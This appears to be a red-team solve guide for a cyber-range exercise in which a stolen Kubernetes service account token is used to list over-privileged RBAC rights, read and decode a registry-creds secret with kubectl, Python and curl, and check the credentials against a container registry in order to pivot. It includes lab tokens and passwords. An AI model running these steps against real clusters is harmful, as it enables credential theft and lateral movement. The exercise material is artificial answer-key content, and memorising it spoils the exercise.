# Solve Guide — Red Team
## RNG-CLD-01 | M3 — cld-k8s | Kubernetes RBAC Over-Privilege → Secrets Read
**Technique:** T1613 / T1552.007 — Container API / Kubernetes Secrets  
**Pivot In:** K8s token `pul-cloud-ci-runner-token-2024gridfall` from M2 kubeconfig

## Objective
Use the stolen service account token to authenticate to the K3s API server, enumerate the over-privileged RBAC policy, and read the `registry-creds` secret to obtain credentials for the container registry on M4.

## Step 1 — Configure kubectl with Stolen Kubeconfig
```bash
export KUBECONFIG=./cloud-ci-kubeconfig.yaml
# Verify connection
kubectl cluster-info
# Kubernetes control plane is running at https://11.0.2.30:6443
```

## Step 2 — Enumerate Namespace Resources
```bash
# List what we can see
kubectl get all -n pul-cloud
kubectl api-resources --verbs=list --namespaced -n pul-cloud

# Check permissions explicitly
kubectl auth can-i --list -n pul-cloud
# get     secrets    YES  ← over-privileged
# list    secrets    YES  ← over-privileged
# get     pods       YES
# get     configmaps YES
```

## Step 3 — Enumerate Secrets
```bash
kubectl get secrets -n pul-cloud
# NAME             TYPE     DATA   AGE
# registry-creds   Opaque   4      Xh
# db-creds         Opaque   5      Xh
```

## Step 4 — Extract Registry Credentials (THE GOAL)
```bash
# Method 1: kubectl jsonpath
kubectl get secret registry-creds -n pul-cloud \
    -o jsonpath='{.data.username}' | base64 -d
# registry-admin

kubectl get secret registry-creds -n pul-cloud \
    -o jsonpath='{.data.password}' | base64 -d
# Reg!stry@CLD2024

# Method 2: full decode
kubectl get secret registry-creds -n pul-cloud -o json | \
    python3 -c "
import sys, json, base64
d = json.load(sys.stdin)['data']
for k, v in d.items():
    print(f'{k}: {base64.b64decode(v).decode()}')
"
# username: registry-admin
# password: Reg!stry@CLD2024
# registry: 11.0.2.40:5000
```

**Or via raw curl (no kubectl needed):**
```bash
TOKEN="pul-cloud-ci-runner-token-2024gridfall"
curl -sk -H "Authorization: Bearer ${TOKEN}" \
    https://11.0.2.30:6443/api/v1/namespaces/pul-cloud/secrets/registry-creds \
    | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)['data']
for k, v in d.items():
    print(k, '=', base64.b64decode(v).decode())
"
```

## Step 5 — Verify Registry Credentials Against M4
```bash
curl -u "registry-admin:Reg!stry@CLD2024" \
    http://11.0.2.40:5000/v2/_catalog
# {"repositories":["pul-cloud/platform-svc"]}
```

Pivot to M4 confirmed.

## Summary
| Item | Value |
|---|---|
| Vulnerability | RBAC grants CI runner access to Secrets (should be denied) |
| Stolen Secret | registry-creds in pul-cloud namespace |
| Registry Creds | registry-admin:Reg!stry@CLD2024 @ 11.0.2.40:5000 |
| Next Target | M4 Container Registry (11.0.2.40:5000) |
| MITRE | T1613, T1552.007 |
